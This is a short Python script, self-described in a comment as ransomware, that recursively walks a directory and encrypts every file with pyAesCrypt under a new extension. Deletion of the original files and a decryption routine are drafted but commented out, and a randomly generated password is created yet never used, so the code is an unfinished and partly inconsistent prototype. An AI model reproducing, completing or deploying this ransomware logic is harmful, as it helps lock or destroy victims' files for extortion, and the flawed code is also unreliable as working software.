import os
import pyAesCrypt 

import random

def encrypt(root, PASSWORD, EXTENSION):
    password = random.getrandbits(128)
    # Recursively traverse directories and print all files
    for directory, subdirs, files in os.walk(root):
        for file in files:
            ## Zip/Encrypt AKA ransomware 
            
            ## attempted decrrypy, needs to store origianl file name somewhwere
            #filepath = os.path.join(directory, file)
            #pyAesCrypt.decryptFile(f"{file}.ENCRYPTED", file, "password")       
            
            filepath = os.path.join(directory, file)
            print(filepath)
            
            pyAesCrypt.encryptFile(filepath, filepath + f".{EXTENSION}", str(PASSWORD))
            ## just need to remove old file now
            #os.remove(filepath)
            
            
        #print(f"DECRYPT PASSWORD: {password} ")
            